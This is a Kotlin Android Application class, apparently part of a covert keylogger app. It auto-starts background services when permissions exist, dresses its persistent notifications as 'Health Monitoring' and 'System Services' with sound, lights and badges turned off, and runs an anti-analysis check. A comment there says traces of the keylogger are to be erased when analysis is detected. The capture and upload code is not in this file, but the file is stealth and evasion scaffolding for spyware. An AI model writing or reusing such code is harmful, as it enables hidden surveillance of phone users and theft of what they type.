package com.android.myapp

import android.app.Application
import android.app.NotificationChannel
import android.app.NotificationManager
import android.os.Build
import com.android.myapp.core.VersionManager
import com.android.myapp.security.AntiAnalysis
import timber.log.Timber
import android.Manifest
import android.content.pm.PackageManager
import android.util.Log
import androidx.core.content.ContextCompat
import com.android.myapp.core.ServiceOrchestrator

class KeyloggerApplication : Application() {

    companion object {
        private const val TAG = "KeyloggerApp"

        // Notification Channels
        const val CHANNEL_SERVICE = "keylogger_service_channel"

        const val CHANNEL_BLE = "ble_channel"

        const val CHANNEL_WORKER = "worker_channel"

        const val NOTIFICATION_CHANNEL_ID = "system_service_channel"

        const val NOTIFICATION_CHANNEL_NAME = "System Services"

        lateinit var instance: KeyloggerApplication
            private set
    }

    override fun onCreate() {
        super.onCreate()

        Log.d(TAG, "Application onCreate")

        // Only auto-start if we have minimum permissions
        // Otherwise, wait for user to grant permissions
        if (hasMinimumPermissions()) {
            Log.d(TAG, "Has minimum permissions, auto-starting orchestrator")
            try {
                ServiceOrchestrator.getInstance(this).initializeAllStrategies()
            } catch (e: Exception) {
                Log.e(TAG, "Error auto-starting orchestrator: ${e.message}", e)
            }
        } else {
            Log.d(TAG, "Missing permissions, waiting for user to grant")
        }

        instance = this

        // Initialize logging (debug builds only)
        if (BuildConfig.DEBUG) {
            Timber.plant(Timber.DebugTree())
        }

        // load sqlcipher
        System.loadLibrary("sqlcipher")

        // Security checks
        performSecurityChecks()

        // Create notification channel
        createNotificationChannels()

        // Initialize version-specific components
        VersionManager.initialize(this)

        Timber.d("Application initialized - Android ${Build.VERSION.SDK_INT}")
    }

    /**
     * Check if we have minimum permissions to run.
     */
    private fun hasMinimumPermissions(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            // Android 12+ needs Bluetooth permissions
            hasPermission(Manifest.permission.BLUETOOTH_SCAN) &&
                    hasPermission(Manifest.permission.BLUETOOTH_CONNECT)
        } else {
            // Older Android just needs location for BLE
            hasPermission(Manifest.permission.ACCESS_FINE_LOCATION)
        }
    }

    private fun hasPermission(permission: String): Boolean {
        return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
    }

    private fun createNotificationChannels() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val notificationManager = getSystemService(NotificationManager::class.java)

            // Health Service Channel (persistent notification)
            val healthChannel = NotificationChannel(
                CHANNEL_SERVICE,
                "Health Monitoring",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Continuous health monitoring service"
                setShowBadge(false)
            }

            // BLE Channel
            val bleChannel = NotificationChannel(
                CHANNEL_BLE,
                "Bluetooth Connectivity",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Bluetooth scanning and connectivity status"
                setShowBadge(false)
            }

            // Worker Channel
            val workerChannel = NotificationChannel(
                CHANNEL_WORKER,
                "Background Tasks",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Background health check tasks"
                setShowBadge(false)
            }

            notificationManager.createNotificationChannels(listOf(
                healthChannel,
                bleChannel,
                workerChannel
            ))
        }
    }

    private fun performSecurityChecks() {
        val antiAnalysis = AntiAnalysis(this)
        val env = antiAnalysis.checkEnvironment()

        if (env.hasAnomalies() || !env.isSafe()){
            // eliminate traces of the keylogger app
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val importance = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                // Android 14+ - can't fully hide
                NotificationManager.IMPORTANCE_MIN
            } else {
                NotificationManager.IMPORTANCE_LOW
            }

            val channel = NotificationChannel(
                NOTIFICATION_CHANNEL_ID,
                NOTIFICATION_CHANNEL_NAME,
                importance
            ).apply {
                description = "Background system operations"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
            }

            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }
}